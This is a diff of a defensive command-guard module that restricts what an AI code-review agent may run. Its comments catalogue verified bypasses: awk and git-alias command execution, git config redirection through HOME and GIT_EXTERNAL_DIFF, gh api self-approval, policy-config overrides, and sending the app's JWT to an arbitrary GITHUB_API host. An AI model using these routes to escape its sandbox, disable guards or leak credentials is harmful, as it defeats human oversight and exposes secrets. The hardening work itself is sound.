@@ -9,30 +9,26 @@
 //
 // The checker is pure (checkBashCommand) so tests need no pi. The pi hookup
 // (`pi.on("tool_call", …)` returning {block, reason}) is a VERIFIED capability
-// per assets/findings.md §5 lines 132-141; the exact payload field
-// names remain VERIFY-ON-PIN.
+// per the pi control-surface findings (§5); the exact payload field names
+// remain VERIFY-ON-PIN.
 //
-// this guard is ONE LAYER, and it is the layer that cannot be the
-// layer. It vets command STRINGS; four adversarial rounds each found a way
-// through, and the decisive ingredient in every one was a FILE the
-// session writes, which a command guard never sees. Two things changed here as
-// a result, and both are about the boundary rather than about any one attack:
+// This guard is ONE LAYER of the exec boundary, not the whole of it. It vets
+// command strings, and a command guard never sees a FILE the session writes —
+// which is the decisive ingredient in every bypass of a string-only guard. So:
 //
-//   · it now also vets the WRITE tools, on one question — is this path a
+//   · it also vets the WRITE tools, on one question — is this path a
 //     PROTECTED write target (`isProtectedWriteTarget`)? That is git's
-//     configuration surface (`isGitConfigSurface`, — the repo config
-//     scope, where a plain `git diff` executes a program named by
-//     `<clone>/.git/config` with no suspicious token in the command at all)
-//     and,, this system's OWN policy surface (`isPolicySurface`
-//     — config.toml, the sanctioned scripts, the compiled guard, the seeds),
-//     which seven rounds of hardening had never protected; and, since
-//     S8b, the memory-scope files a session's own recall reads
-//     (`isMemoryScopeSurface` — the recall hint and the retired list);
-//   · the global/XDG/system scopes are closed OUTSIDE this file entirely, by
+//     configuration surface (`isGitConfigSurface` — the repo config scope,
+//     where a plain `git diff` executes a program named by
+//     `<clone>/.git/config` with no suspicious token in the command at all),
+//     this system's own policy surface (`isPolicySurface` — config.toml, the
+//     sanctioned scripts, the compiled guard, the seeds), and the memory-scope
+//     files a session's own recall reads (`isMemoryScopeSurface` — the recall
+//     hint and the retired list);
+//   · the global/XDG/system scopes are closed OUTSIDE this file, by
 //     `sessionGitConfigPins` in src/sessions.ts, which pins where git looks for
-//     configuration at spawn. That is not a rule this guard enforces; it is a
-//     search that no longer happens. The guard's job there is only to stop a
-//     caller RE-POINTING the pin (COMMAND_INJECTING_ENV), and that job stays.
+//     configuration at spawn. The guard's job there is only to stop a caller
+//     RE-POINTING the pin (COMMAND_INJECTING_ENV).
 import { readFileSync } from "node:fs";
 import { posix } from "node:path";
 import type { Pi, ToolCallEvent } from "@earendil-works/pi-coding-agent";
@@ -40,31 +36,23 @@ import type { Pi, ToolCallEvent } from "@earendil-works/pi-coding-agent";
 /**
  * Read-only programs a review session may run directly.
  *
- * **`awk` is deliberately ABSENT, and must not be re-added** (round 3).
- * It was here, gated by four regexes in `checkReaderModes`, and that gating was
- * unsound in a way no fifth regex fixes. `awk` is a programming language in
- * which `system(x)`, `x | getline`, `print | x` and `print > x` are all
- * first-class and every one takes an ARBITRARY EXPRESSION. The rules keyed on a
- * quote, `$` or `(` after the operator, so a bare identifier holding the
- * command defeated all of them. VERIFIED executing:
+ * **`awk` is deliberately ABSENT, and must not be re-added.** No regex gating
+ * of awk is sound: it is a programming language in which `system(x)`,
+ * `x | getline`, `print | x` and `print > x` are all first-class and every one
+ * takes an ARBITRARY EXPRESSION, so a bare identifier holding the command
+ * defeats any rule keyed on the token after the operator. VERIFIED executing:
  *
  *     awk 'BEGIN{c="sh"; print "<cmd>" | c}'        → ran <cmd>
  *     awk 'BEGIN{f="<path>"; print "x" > f}'        → wrote <path>
  *     awk 'BEGIN{f=".git/config"; printf … >> f}'   → then a plain `git diff` ran <cmd>
  *
- * The first is the one that mattered: arbitrary execution with **no config file
- * touched**, so the round-boundary integrity check could not see it either, and
- * the outcome layer only sees reviews. Five layers, none of them covering it —
- * against a manifesto non-goal that says the reviewer never executes anything.
- * That is `T=.git/config; cat p >> $T` moved one level in, into a language
- * being parsed with regexes, and this file's own seventh review rule says stop
- * adding patterns and change the shape.
+ * The first is arbitrary execution with no config file touched, so the
+ * round-boundary integrity check cannot see it either.
  *
  * The cost is close to zero: `awk` appears in no prompt, no agent and no
- * session-sanctioned script (the only occurrence in the tree is
- * `scripts/deploy.sh`, which sessions cannot run). A reviewer keeps `rg`,
- * `grep`, `jq`, `cut`, `sort`, `uniq`, `head`, `tail`, `wc`, `nl`, `tr` and
- * `sed -n` — and `gawk`/`mawk`/`nawk` were never here either.
+ * session-sanctioned script. A reviewer keeps `rg`, `grep`, `jq`, `cut`,
+ * `sort`, `uniq`, `head`, `tail`, `wc`, `nl`, `tr` and `sed -n`; `gawk`,
+ * `mawk` and `nawk` are off ALLOWED too.
  *
  * `sed` stays, on a narrower argument: its script language has exactly three
  * file/exec verbs (`w`/`r`/`e`) and they are single letters at a command
@@ -74,9 +62,8 @@ import type { Pi, ToolCallEvent } from "@earendil-works/pi-coding-agent";
  * config file.
  *
  * Exported in ORDER because the sentence every built pass reads ("Allowed
- * commands: …", `src/include.ts`) is rendered from this array: the
- * prompt kept advertising `awk` after it came off this list, and a model
- * told a tool exists and then refused reads the refusal as a malfunction. The
+ * commands: …", `src/include.ts`) is rendered from this array: a model told a
+ * tool exists and then refused reads the refusal as a malfunction, so the
  * enforcing half is the only author of the advertised half;
  * `tests/fences.test.ts` holds the advertised set equal to this array, runs
  * every advertised program through `checkBashCommand` (from source), and
@@ -130,19 +117,18 @@ const INTERPRETER_REASONS: Readonly<Record<string, string>> = {
 
 /** Sanctioned sandbox scripts — the controlled surface for routine GitHub
  * reads and gate-mirrored posting. mint-token.sh is sanctioned because the
- * templates allow raw READ-ONLY `gh`, which needs `GH_TOKEN="$(…)"` (first
- * live day blocked 9 legitimate reads on it). deploy.sh stays unreachable. */
+ * templates allow raw READ-ONLY `gh`, which needs `GH_TOKEN="$(…)"`.
+ * deploy.sh stays unreachable. */
 const SANCTIONED_SCRIPTS = new Set([
   "approve-pr.sh",
   "mint-token.sh",
   "pr-context.sh",
   "pr-checks.sh",
-  // pr-self.sh is MANDATED by all three round templates and was absent here,
-  // so every invocation form was blocked and the mandated read simply failed
-  // (MC-08). Read-only by construction — GETs only, no method override, no
-  // body — and its two delegates, pr-threads.sh and pr-checks.sh, are already
-  // sanctioned. `tests/fences.test.ts` now derives this set from the prompts,
-  // so the exec policy and the prompt contract can no longer disagree.
+  // Mandated by all three round templates. Read-only by construction — GETs
+  // only, no method override, no body — and its two delegates, pr-threads.sh
+  // and pr-checks.sh, are sanctioned too. `tests/fences.test.ts` derives this
+  // set from the prompts, so the exec policy and the prompt contract cannot
+  // disagree.
   "pr-self.sh",
   "pr-threads.sh",
   "post-review.sh",
@@ -151,19 +137,19 @@ const SANCTIONED_SCRIPTS = new Set([
   // findings record, writes the two pinned scratch files under state/. Posts
   // nothing; posting still goes through post-review.sh / approve-pr.sh.
   "render-review.sh",
-  // H1a: the round templates stage the verdict at verdict/<name>.tmp
-  // and publish it with this — one rename inside verdict/, so the daemon never
-  // reads a half-written verdict (#5885). `mv` itself stays off ALLOWED: the
-  // script takes only the two verdict-file name shapes, writes nothing
-  // outside verdict/, reads no config and posts nothing. Its `--from-record`
-  // mode also READS the round's own findings record to build the
-  // verdict from fields the session already wrote — still no other write.
+  // The round templates stage the verdict at verdict/<name>.tmp and publish
+  // it with this — one rename inside verdict/, so the daemon never reads a
+  // half-written verdict. `mv` itself stays off ALLOWED: the script takes only
+  // the two verdict-file name shapes, writes nothing outside verdict/, reads
+  // no config and posts nothing. Its `--from-record` mode also READS the
+  // round's own findings record to build the verdict from fields the session
+  // already wrote — still no other write.
   "commit-verdict.sh",
 ]);
 
-/** Agent-spawning programs. These already fell off ALLOWED, but the generic
- * "not an allowed read-only command" reason never told the model what to do
- * instead — and the single-shepherd invariant (S3) deserves a rule that greps.
+/** Agent-spawning programs. They are off ALLOWED already; this set exists so
+ * the refusal tells the model what to do instead, and so the single-shepherd
+ * invariant has a rule that greps.
  * The PR's main pi is the only scheduler of agents, and the `subagent` tool is
  * its only launcher. */
 const AGENT_SPAWNERS = new Set([
@@ -217,17 +203,14 @@ const REPLAY_NO_SCRIPTS =
   "exec policy: a regression replay session runs no sandbox script — it reads the tree and writes one findings file";
 
 /**
- * `gh` is READ-ONLY. It used to be a blocklist of three verbs —
- * `gh pr merge|close|edit` — which left `gh pr review <n> --approve` allowed:
- * a direct approval around the mutation gate, the CI gate and `dry_run`, using
- * a credential the session can mint from the sanctioned `scripts/mint-token.sh`
- * (that installation token carries `pull_requests: write`, and it is the very
- * token `scripts/approve-pr.sh` uses to POST an APPROVE review). A blocklist
- * also has to be extended every time `gh` grows a verb, and it had not been.
- *
- * So the shape is inverted: only the read verbs named here are allowed, plus
- * `gh api` without a mutating method or field flag. Every posting mutation goes
- * through the sanctioned scripts, which mirror the gate's guards.
+ * `gh` is READ-ONLY, by ALLOWLIST: only the read verbs named here are allowed,
+ * plus `gh api` without a mutating method or body flag. A blocklist would
+ * leave verbs like `gh pr review <n> --approve` open — a direct approval
+ * around the mutation gate, the CI gate and `dry_run`, using the installation
+ * token the session can mint from the sanctioned `scripts/mint-token.sh`
+ * (which carries `pull_requests: write`) — and would need extending every time
+ * `gh` grows a verb. Every posting mutation goes through the sanctioned
+ * scripts, which mirror the gate's guards.
  */
 const GH_READONLY_VERBS: Readonly<Record<string, ReadonlySet<string>>> = {
   pr: new Set(["view", "list", "diff", "checks", "status"]),
@@ -254,19 +237,15 @@ const GH_READONLY_NAMESPACES: ReadonlySet<string> = new Set([
 /**
  * `gh api` flags that carry a REQUEST BODY, and so promote gh's default GET to
  * POST. Enumerated against `gh api --help` on gh 2.93.0 and confirmed
- * empirically against a loopback server (follow-up):
+ * empirically against a loopback server:
  *
  *     gh api <path> --input f        → POST      gh api <path>                → GET
  *     gh api <path> --input=f        → POST      gh api <path> --method GET … → GET
  *
- * `--input` is the one that mattered and the one a flag blocklist missed: it is
- * the recipe the PREDECESSOR system actually used to post every one of its
- * reviews — "a JSON file written with `Write` then `POST`ed via
- * `gh api .../pulls/<n>/reviews --input`" (the retro corpus, sources/12-review-content.md — in the state home).
- * A session can write `{"event":"APPROVE"}` with its ordinary write tool and
- * mint the token from the sanctioned `scripts/mint-token.sh`, so leaving this
- * open left the historical approval channel open while closing the documented
- * one.
+ * `--input` matters most: a session can write `{"event":"APPROVE"}` with its
+ * ordinary write tool, mint the token from the sanctioned
+ * `scripts/mint-token.sh`, and `gh api .../pulls/<n>/reviews --input` it — a
+ * complete approval channel.
  *
  * NOTE — `-i` is deliberately NOT a body flag. In gh it is `--include` (print
  * response status line and headers), a pure READ flag; `--input` has no short
@@ -285,18 +264,17 @@ const GH_API_BODY_FLAG_ATTACHED = /^(--input|--field|--raw-field)=/;
 /**
  * The SHORT body flags, structurally rather than by spelling.
  *
- * The set above is complete by flag NAME and was still bypassed, because a
- * name is not a form: `-fevent=APPROVE` attaches the value, and `-if` clusters
- * the boolean `-i` in front of `-f`. Both send POST, verified on gh 2.93.0:
+ * The set above is complete by flag NAME, but a name is not a form:
+ * `-fevent=APPROVE` attaches the value, and `-if` clusters the boolean `-i` in
+ * front of `-f`. Both send POST, verified on gh 2.93.0:
  *
  *     gh api <path> -fevent=APPROVE   → POST
  *     gh api <path> -Fevent=APPROVE   → POST
  *     gh api <path> -if event=APPROVE → POST
  *     gh api <path> -i                → GET
  *
- * That is the SAME failure mode as `--input` itself — an unenumerated form
- * rather than an unenumerated name — so the answer is a shape, not three more
- * literals. Any single-dash cluster containing `f` or `F` carries a body;
+ * So the rule is a shape, not more literals: any single-dash cluster
+ * containing `f` or `F` carries a body;
  * `-i` alone contains neither, so `--include` keeps working. `-X`/`-XPOST`
  * contain neither either, and are handled by the explicit-method branch.
  */
@@ -305,10 +283,8 @@ const GH_API_SHORT_BODY_CLUSTER = /^-[A-Za-z]*[fF]/;
 /**
  * What method will this `gh api` invocation actually send?
  *
- * The old check asked "does any flag look mutating?", which is a blocklist and
- * missed `--input`. This asks the question that decides the outcome: an
- * explicit `-X`/`--method` wins, otherwise a body flag promotes GET to POST,
- * otherwise it is gh's default GET. Only GET is allowed.
+ * An explicit `-X`/`--method` wins, otherwise a body flag promotes GET to
+ * POST, otherwise it is gh's default GET. Only GET (and HEAD) is allowed.
  */
 function ghApiEffectiveMethod(args: string[]): string {
   let explicit: string | null = null;
@@ -342,8 +318,7 @@ function checkGh(args: string[]): BashCheck {
   // none, and every `--repo`-style flag belongs to a subcommand and follows it.
   // So `gh --repo o/n pr view` lands on `o/n`, which is not a namespace and is
   // REFUSED. That fails closed, which is correct, and the reason names `o/n`
-  // rather than `pr` — the comment here used to claim the opposite, which is
-  // a false claim about behaviour in a security-relevant file.
+  // rather than `pr`.
   let i = 0;
   while (i < args.length && args[i]!.startsWith("-")) i++;
   const ns = args[i];
@@ -374,30 +349,23 @@ function checkGh(args: string[]): BashCheck {
 }
 
 /**
- * `git` is READ-ONLY too, and — like `gh` — by ALLOWLIST.
+ * `git` is READ-ONLY too, and — like `gh` — by ALLOWLIST, which keeps `git
+ * push` (a GitHub write around the one gate) and the discard family
+ * (`reset --hard`, `checkout --`, `clean -fdx`, `stash`) out. A blocklist of
+ * write verbs does not hold:
  *
- * It first sat unconditionally on ALLOWED, three lines from `gh`'s filter, so
- * `git push` (a GitHub write around the one gate) and the discard family
- * (`reset --hard`, `checkout --`, `clean -fdx`, `stash`) were all permitted.
- * The first fix used a blocklist of write verbs, on the reasoning that reading
- * is what a session does all day with git and a missed read verb would wedge a
- * live review. That reasoning was wrong, and adversarial review proved it in
- * three ways:
- *
- *   1. The blocklist was not closed. `send-pack` — the documented plumbing for
- *      `push`, the very mutation blocked three lines above — was absent, as
- *      were `bundle`, `archive`, `svn`, `p4`, `daemon`, `fast-export`,
- *      `symbolic-ref`, `reflog`, `difftool`, `update-server-info`, and
- *      `branch -D` / `tag -d`.
- *   2. A blocklist keys on the verb, and `-c alias.x='!<shell>' x` supplies a
- *      NEW verb in one token. VERIFIED executing on this host.
+ *   1. It is never closed: `send-pack` (the plumbing for `push`), `bundle`,
+ *      `archive`, `svn`, `p4`, `daemon`, `fast-export`, `symbolic-ref`,
+ *      `reflog`, `difftool`, `update-server-info`, `branch -D` / `tag -d`…
+ *   2. It keys on the verb, and `-c alias.x='!<shell>' x` supplies a NEW verb
+ *      in one token. VERIFIED executing.
  *   3. `git -C /some/repo <alias>` runs an alias out of that repo's own
  *      config. Under an allowlist the alias name is simply not a sanctioned
  *      read verb, so the whole class dies without enumerating it.
  *
  * A blocked read verb is a loud, recoverable refusal naming what to do; an
  * unblocked write verb is an ungated mutation. The failure modes are not
- * symmetric, which is what the first shape got wrong.
+ * symmetric.
  */
 const GIT_READONLY_VERBS: ReadonlySet<string> = new Set([
   "log",
@@ -469,10 +437,8 @@ const GIT_READONLY_SUBVERBS: Readonly<Record<string, ReadonlySet<string>>> = {
 /**
  * Options that let git run a command of the caller's choosing.
  *
- * The family has THREE members, not two, and the shape only became clear after
- * the third was found. What they have in common is not "sets config" — it is
- * **anything that changes WHICH CONFIG GIT READS, or names a program
- * directly.**
+ * The family is **anything that changes WHICH CONFIG GIT READS, or names a
+ * program directly** — three members:
  *
  *   1. INJECT config inline — `-c key=value`, `--config-env=key=ENVVAR`.
  *   2. NAME a program — `--upload-pack`, `--receive-pack`, `--exec`,
@@ -496,30 +462,22 @@ const GIT_READONLY_SUBVERBS: Readonly<Record<string, ReadonlySet<string>>> = {
  *   HOME=<dir> git diff --no-index <A> <B>                → ran <cmd>
  *   XDG_CONFIG_HOME=<dir> git diff --no-index <A> <B>     → ran <cmd>
  *
- * Category 3 is the worst of them and took two rounds to see whole. The
- * minimum viable evil "repo" is ONE PLAIN-TEXT FILE: `--no-index` means git
- * never validates the directory as a repository, so there is no `objects/`,
- * no `refs/`, no `git init` and no exec bit — a session writes the config
- * with its ordinary write tool. `--ext-diff` is NOT required, because
- * `git diff` honours `diff.external` by default.
+ * Category 3 is the worst of them. The minimum viable evil "repo" is ONE
+ * PLAIN-TEXT FILE: `--no-index` means git never validates the directory as a
+ * repository, so there is no `objects/`, no `refs/`, no `git init` and no exec
+ * bit — a session writes the config with its ordinary write tool.
+ * `--ext-diff` is NOT required, because `git diff` honours `diff.external` by
+ * default. Note the implicit SEARCH PATH (`HOME`, `XDG_CONFIG_HOME`) is as
+ * much a relocator as the explicit pointers (`GIT_CONFIG_GLOBAL`,
+ * `GIT_CONFIG_SYSTEM`).
  *
- * The lesson of the miss is worth keeping: the explicit pointers
- * (`GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`) were blocked while the implicit
- * SEARCH PATH they fall back to — `HOME`, `XDG_CONFIG_HOME` — was open. The
- * category is any control over WHICH CONFIG GIT READS, not the subset of it
- * that names a config file outright.
- *
- * `-C <dir>` is deliberately NOT here, and the reason is narrower than it once
- * claimed. `-C` DOES reach config: it chdirs, git then DISCOVERS the
- * repository there and reads its config, arriving at the same `diff.external`.
- * (An earlier note here asserted it "can neither relocate config nor name a
- * command" — that was false, and produced by testing against a stub `.git`
- * rather than a real repository.) It stays allowed because discovery requires
- * a VALID repository whose config the session controls, and `git init` and
+ * `-C <dir>` is deliberately NOT here. `-C` DOES reach config: it chdirs, git
+ * then DISCOVERS the repository there and reads its config, arriving at the
+ * same `diff.external`. It stays allowed because discovery requires a VALID
+ * repository whose config the session controls, and `git init` and
  * `git clone` are both off the verb allowlist above — so the session cannot
- * create one. That is a real bound, but it is a different bound, and this file
- * has already paid once for a docstring asserting a closedness it did not
- * have.
+ * create one. That is a real bound, but a different one from "cannot reach
+ * config".
  */
 const GIT_COMMAND_INJECTING_OPTS =
   /^(?:-c|--config-env|--upload-pack|--receive-pack|--exec|--exec-path|--git-dir|--work-tree)(?:=|$)/;
@@ -529,22 +487,20 @@ const GIT_COMMAND_INJECTING_OPTS =
  *
  * `git show -c` / `git log -c` / `git diff-tree -c` is git's COMBINED
  * MERGE DIFF option, not config injection — and it is exactly the tool the
- * ratified recheck decision needs: a hand-resolved conflict must be audited
- * against BOTH merge parents. Blocking it was a real functional regression in
- * a capability the system depends on. Git's top-level `-c` must precede the
- * subcommand anyway, so the before-verb check above loses nothing.
+ * recheck needs: a hand-resolved conflict is audited against BOTH merge
+ * parents. Git's top-level `-c` must precede the subcommand anyway, so the
+ * before-verb check above loses nothing.
  */
 const GIT_COMMAND_INJECTING_OPTS_AFTER_VERB =
   /^(?:--config-env|--upload-pack|--receive-pack|--exec|--exec-path|--git-dir|--work-tree)(?:=|$)/;
 
 /**
- * The read verbs' own WRITE option (S8b review). `--output=<file>`
- * (and `--output <file>`) is a diff option: `git log`, `git show`, `git diff`
- * and every verb that takes diff options write their output INTO THAT FILE,
- * and `--format=format:<text>` or a committed blob (`git show HEAD:<path>`)
- * makes the bytes anything at all. VERIFIED on this host (git 2.55):
- * `git show HEAD:a.json --output <dir>/o2` wrote the blob byte for byte. It
- * named a protected path in plain sight and walked past the write veto,
+ * The read verbs' own WRITE option. `--output=<file>` (and `--output <file>`)
+ * is a diff option: `git log`, `git show`, `git diff` and every verb that
+ * takes diff options write their output INTO THAT FILE, and
+ * `--format=format:<text>` or a committed blob (`git show HEAD:<path>`) makes
+ * the bytes anything at all. VERIFIED (git 2.55): `git show HEAD:a.json
+ * --output <dir>/o2` wrote the blob byte for byte — past the write veto,
  * which reads redirections and `sed -i` only. A reviewer reads output on
  * stdout; it never needs git to write a file. Exact name only: git refuses
  * an abbreviation (`--outp`, `--outpu` — ambiguous with
@@ -555,11 +511,11 @@ const GIT_OUTPUT_FILE_OPT = /^--output(?:=|$)/;
 /**
  * `git grep`'s `--open-files-in-pager[=<cmd>]` / `-O[<cmd>]` RUNS the named
  * program on the matching files — VERIFIED: `git grep -O"touch <f>" a` and
- * `git grep -nO…` created the file. Found while closing `--output`; it is
- * arbitrary execution through a read verb, not a config relocation, so it
- * is its own rule. parse-options accepts any unique abbreviation of the long
- * form (`--op`, `--open=…` VERIFIED), and `-O` can end a short cluster
- * (`-nO<cmd>`) — so a short cluster is walked letter by letter, stopping at
+ * `git grep -nO…` created the file. It is arbitrary execution through a read
+ * verb, not a config relocation, so it is its own rule. parse-options accepts
+ * any unique abbreviation of the long form (`--op`, `--open=…` VERIFIED),
+ * and `-O` can end a short cluster (`-nO<cmd>`) — so a short cluster is
+ * walked letter by letter, stopping at
  * the options that take the rest of the word as their value.
  */
 const GIT_GREP_PAGER_LONG = "open-files-in-pager";
@@ -578,8 +534,7 @@ function isGitGrepPagerOpt(a: string): boolean {
 function checkGit(rawGitArgs: string[]): BashCheck {
   // Judged as git RECEIVES them: bash removes inner quotes and backslashes
   // before git parses an option, so `--up"load"-pack=…`, `--git-"dir"=…` and
-  // `--out"put"=…` are the options they spell (the first two VERIFIED
-  // allowed before this, S8b review).
+  // `--out"put"=…` are the options they spell.
   const args = rawGitArgs.map(dequote).filter((a) => a.length > 0);
   // Leading global options, before the verb.
   let i = 0;
@@ -615,11 +570,10 @@ function checkGit(rawGitArgs: string[]): BashCheck {
   }
   const sub = GIT_READONLY_SUBVERBS[verb];
   if (sub !== undefined) {
-    // POSITIONAL, not `some()` over every argument (F8). A scan of all args
-    // would accept the read-only marker wherever it appeared — including as
-    // the VALUE of a write form, e.g. `git branch -m list`. Proven inert
-    // today, but only by accident of which spellings collide; the first token
-    // after the verb is the one that decides what the command does.
+    // POSITIONAL, not `some()` over every argument. A scan of all args would
+    // accept the read-only marker wherever it appeared — including as the
+    // VALUE of a write form, e.g. `git branch -m list`. The first token after
+    // the verb is the one that decides what the command does.
     return sub.has(args[i + 1] ?? "")
       ? { allowed: true }
       : block(
@@ -639,11 +593,11 @@ function checkGit(rawGitArgs: string[]): BashCheck {
 
 /**
  * Environment variables that name a PROGRAM for an otherwise-allowed command to
- * run — the env twin of `git -c` (follow-up). `VAR=val` prefixes are
- * skipped by the splitter below, so without this a read verb carries the
- * payload instead of the verb doing it.
+ * run — the env twin of `git -c`. `VAR=val` prefixes are skipped by the
+ * splitter below, so without this a read verb carries the payload instead of
+ * the verb doing it.
  *
- * VERIFIED on this host, not inferred:
+ * VERIFIED, not inferred:
  *   GIT_EXTERNAL_DIFF="<cmd>" git diff --ext-diff -- <file>   → ran <cmd>
  *
  * The git family (pager, external diff, ssh, editor, askpass, and the
@@ -679,10 +633,9 @@ const COMMAND_INJECTING_ENV = new Set([
   // …and the same category at the GLOBAL/XDG scope. `GIT_CONFIG_GLOBAL` and
   // `GIT_CONFIG_SYSTEM` above are the EXPLICIT pointers; these two are the
   // implicit SEARCH PATH those fall back to — `$HOME/.gitconfig` and
-  // `$XDG_CONFIG_HOME/git/config`. Blocking the explicit door and leaving the
-  // implicit one open beside it is exactly the shape of the miss. Same
-  // primitive and the same cost as the repo-scope form: one plain-text file
-  // written with the ordinary write tool, plus one ALLOWED command.
+  // `$XDG_CONFIG_HOME/git/config`. Same primitive and the same cost as the
+  // repo-scope form: one plain-text file written with the ordinary write tool,
+  // plus one ALLOWED command.
   // VERIFIED executing: HOME=<dir> git diff --no-index A B.
   "HOME",
   "XDG_CONFIG_HOME",
@@ -707,45 +660,41 @@ const COMMAND_INJECTING_ENV_RE = /^GIT_CONFIG_(KEY|VALUE)_\d+$/;
 
 /**
  * Environment variables that RELOCATE this system's own policy inputs — the
- * same primitive as `HOME=` above, aimed at us instead of at git (MC-05,
- * fenced by `tests/fences.test.ts` and `tests/bash-guard.test.ts`).
+ * same primitive as `HOME=` above, aimed at us instead of at git (fenced by
+ * `tests/fences.test.ts` and `tests/bash-guard.test.ts`).
  *
  * The posting scripts are sanctioned, and every guard knob they consult is
- * read out of `$QCR_CONFIG`:
+ * read out of `$QCR_CONFIG`. Without this,
  *
  *     QCR_CONFIG=/tmp/mine.toml bash scripts/approve-pr.sh 5 body.md
  *
- * passed the exec policy, because `VAR=val` prefixes are skipped by the
- * splitter and only the git family was named. `guard_enabled` treats a knob as
- * ON unless the value is literally `false`, so one hand-written TOML file —
- * created with the ordinary write tool, which reviewer sessions have — turns
- * guards 2 through 5 off on a REAL approval. The same file carries `dry_run`,
- * so it also flips a dry-run install into posting for real: hard rule 1, by an
- * env prefix.
+ * would pass: `guard_enabled` treats a knob as ON unless the value is
+ * literally `false`, so one hand-written TOML file — created with the ordinary
+ * write tool — turns guards 2 through 5 off on a REAL approval. The same file
+ * carries `dry_run`, so it would also flip a dry-run install into posting for
+ * real (hard rule 1).
  *
  * `QCR_STATE_DB` relocates the database the guards query for the head mark and
  * the approval-withheld state; `QCR_DRYRUN_DIR` relocates where a suppressed
  * intent is recorded, which is the only evidence a dry-run run leaves.
  *
- * SCOPE: this closes the ENV-PREFIX spelling of MC-05. The two further routes
- * the review found — `bash -c '<sanctioned script> ; <anything>'` past
- * the segment policy, and overwriting the config / `guards.sh` / the posting
- * scripts / the compiled guard outright — are closed: the `bash -c`
- * payload is re-parsed as its own command (`bashCPayload`, from
- * `checkSegment`), and every policy-carrying file is unwritable at BOTH the
- * write-tool and the shell-redirection boundary (`isPolicySurface`).
+ * SCOPE: this closes the ENV-PREFIX spelling. The two further routes —
+ * `bash -c '<sanctioned script> ; <anything>'` past the segment policy, and
+ * overwriting the config / `guards.sh` / the posting scripts / the compiled
+ * guard outright — are closed elsewhere: the `bash -c` payload is re-parsed as
+ * its own command (`bashCPayload`, from `checkSegment`), and every
+ * policy-carrying file is unwritable at BOTH the write-tool and the
+ * shell-redirection boundary (`isPolicySurface`).
  *
- * `QCR_POSTING_RECEIPT_DIR` is HERE as, moved out of the
- * "arguments" list below after the review flagged it as "closer to a
- * relocator than to an argument". The ruling: it names a DIRECTORY, exactly
- * like `QCR_DRYRUN_DIR` and `QCR_STATE_DB` beside it, not a per-call value like
- * `QCR_EXPECTED_HEAD`; the daemon never sets it (it relies on the scripts'
- * default `$ROOT/state/posting-receipts`, and `verdicts.ts` reads that same
- * default), so blocking it breaks no dispatch path; and a session has no
- * business moving where the posting RECEIPT — the record that settles a round —
- * is written. It is a relocator, and it is refused.
+ * `QCR_POSTING_RECEIPT_DIR` is a relocator, not an argument: it names a
+ * DIRECTORY, exactly like `QCR_DRYRUN_DIR` and `QCR_STATE_DB` beside it, not a
+ * per-call value like `QCR_EXPECTED_HEAD`; the daemon never sets it (it relies
+ * on the scripts' default `$ROOT/state/posting-receipts`, and `verdicts.ts`
+ * reads that same default), so blocking it breaks no dispatch path; and a
+ * session has no business moving where the posting RECEIPT — the record that
+ * settles a round — is written.
  *
- * `QCR_INSTALL` is HERE as: the install locator (src/install.ts,
+ * `QCR_INSTALL` is a relocator too: the install locator (src/install.ts,
  * mirrored by scripts/install-locator.sh) finds the live config in
  * `$XDG_CONFIG_HOME/qcr/$QCR_INSTALL/`, so naming another install is
  * `QCR_CONFIG=` by another spelling. (`HOME=` and `XDG_CONFIG_HOME=`, the
@@ -768,17 +717,16 @@ const POLICY_RELOCATING_ENV = new Set([
 ]);
 
 /**
- * Env prefixes that move where a sanctioned script SENDS the App's credentials
- * (found by execution). Every script that talks to GitHub reads its
- * host from `GITHUB_API`, and `mint-token.sh` posts the App's signed JWT to it
- * to mint an installation token — so `GITHUB_API=http://anywhere
- * scripts/mint-token.sh` handed the JWT (which can mint a token for every
- * installation of the App) to a host the session chose, through the one
- * network channel this policy otherwise leaves closed: curl, wget and every
- * interpreter are refused. The daemon never sets it for a session; the
- * scripts' own default (`https://api.github.com`) is the only host a review
- * needs. Tests point the scripts at a loopback stub by running them directly,
- * never through this guard.
+ * Env prefixes that move where a sanctioned script SENDS the App's credentials.
+ * Every script that talks to GitHub reads its host from `GITHUB_API`, and
+ * `mint-token.sh` posts the App's signed JWT to it to mint an installation
+ * token — so `GITHUB_API=http://anywhere scripts/mint-token.sh` would hand the
+ * JWT (which can mint a token for every installation of the App) to a host
+ * the session chose, through the one network channel this policy otherwise
+ * leaves closed: curl, wget and every interpreter are refused. The daemon never
+ * sets it for a session; the scripts' own default (`https://api.github.com`) is
+ * the only host a review needs. Tests point the scripts at a loopback stub by
+ * running them directly, never through this guard.
  */
 const CREDENTIAL_RELOCATING_ENV = new Set(["GITHUB_API"]);
 
@@ -820,8 +768,7 @@ function checkSegment(segment: string, tokens: string[], depth: number): BashChe
     }
     if (afterEnv && raw.startsWith("-")) {
       // `env -S '<string>'` SPLITS its string into a program and arguments —
-      // a second command line inside this one. `env -S 'bash -c "git push"'`
-      // walked through the prior form of this guard (VERIFIED running).
+      // a second command line inside this one (`env -S 'bash -c "git push"'`).
       // Nothing a reviewer does needs it.
       if (/^-[A-Za-z0-9]*S|^--split-string/.test(raw)) {
         return block(
@@ -836,7 +783,7 @@ function checkSegment(segment: string, tokens: string[], depth: number): BashChe
     const args = rawArgs.map((t) => t.replace(/^['"]+|['"]+$/g, ""));
     if (raw.slice(raw.lastIndexOf("/") + 1) === "bash") {
       // `bash -c <payload>` is a whole command line inside ONE word, so it is
-      // judged from the RAW segment, never from these tokens (door 4).
+      // judged from the RAW segment, never from these tokens.
       const lifted = bashCPayload(segment);
       if (lifted.kind === "payload") {
         if (depth >= MAX_NESTED_COMMAND_DEPTH)
@@ -1034,8 +981,8 @@ function checkProgram(
   }
   if (base === "bash") {
     // A `bash -c` with a readable payload never reaches here: `checkSegment`
-    // lifts it from the raw segment and re-parses it (door 4). What
-    // does reach here is `bash -c` through `xargs`, or a -c form
+    // lifts it from the raw segment and re-parses it. What does reach here is
+    // `bash -c` through `xargs`, or a -c form
     // `bashCPayload` did not recognise — and a command string nobody vetted
     // must not run, so any -c BEFORE the script is refused. Otherwise bash may
     // ONLY launch a sanctioned scripts/*.sh (flags before it allowed; anything
@@ -1069,30 +1016,27 @@ function checkProgram(
   }
   if (ALLOWED.has(base)) {
     // Allowlisted for READING is not allowlisted outright: sed/sort/find each
-    // carry a write or exec mode (round 2, all VERIFIED).
+    // carry a write or exec mode (all VERIFIED).
     return checkReaderModes(base, args, rawArgs);
   }
   // ALLOWLIST MEMBERSHIP is what decides — this table only makes the refusal
